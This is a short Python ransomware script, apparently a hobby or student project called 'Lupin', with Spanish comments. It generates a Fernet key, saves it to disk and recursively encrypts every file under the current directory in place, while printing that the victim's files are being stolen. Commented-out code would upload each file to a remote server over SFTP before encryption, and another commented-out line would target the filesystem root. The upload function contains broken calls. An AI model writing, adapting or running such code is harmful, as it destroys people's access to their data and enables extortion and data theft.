import os
from cryptography.fernet import Fernet
import paramiko
import shutil
import getpass


#Primero buscamos todos los archivos del dorectorio menos el propio Lupin
# Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos

print ("Todo sus archivos van a ser robados")

#Generación de la llave con Fernet. Evita que se pueda abrir un archivo al menos que se tenga la llave
llave = Fernet.generate_key()
with open("laLLave.key","wb") as laLLave:
    laLLave.write(llave)

#pasar archivos a servidor
def pasar_archivos(ruta_local,ruta_local_copia,host,port,usuario,contraseña,ruta_remota):
    #copiamos el archivo
    shutil.copy(ruta_local,ruta_local_copia)

    #lo pasamos
    with paramiko.Transport((host,port)) as transporte:
        transporte.connect(username=usuario,password=contraseña)

    sftp = paramiko.SFTPClient.from_transport(transporte)
    sftp.put(ruta_local_copia,)

    #lo borramos
    shutil.rmtree(ruta_local_copia,ruta_remota)

#encriptar archivos
def encriptar_archivo(nombre_archivo,llave):
    with open(nombre_archivo,"rb") as archivo:
        contenido = archivo.read()
    encriptado = Fernet(llave).encrypt(contenido)
    with open(nombre_archivo,"wb") as archivo_encrypt:
        archivo_encrypt.write(encriptado)

#encriptar directorio
def encriptar_directorio(ruta_directorio,llave):#,host,port,usuario,contraseña):
    for raiz, directorios, archivos in os.walk(ruta_directorio): # trabaja de forma recusiva
        for nombre_archivo in archivos:
            if nombre_archivo in ["Lupin.py","ganimard.py","laLLave.key"]:
                continue
            else:
                ruta_completa = os.path.join(raiz,nombre_archivo)
                '''
                nombre_archivo_copia = "copia" + nombre_archivo
                ruta_completa_copia = os.path.join(raiz,nombre_archivo_copia)
                ruta_remota = "./" + nombre_archivo
                pasar_archivos(ruta_completa,ruta_completa_copia,host,port,usuario,contraseña,ruta_remota)
                '''
                encriptar_archivo(ruta_completa,llave)

'''
# Configuración de la conexión SSH al servidor remoto
host = getpass.getpass(prompt='IP: ')
port = getpass.getpass(prompt='Puerto: ')
usuario = getpass.getpass(prompt='Usuario: ')
clave_privada = getpass.getpass(prompt='Contraseña: ')
'''

#directorio actual y lo que hay debajo
encriptar_directorio('.',llave)#,host,port,usuario,clave_privada)
#Enciptar Todo
#encriptar_directorio('../../../../../../../../../../../../',llave)
    
        
print ("Todo sus archivos han sido robados")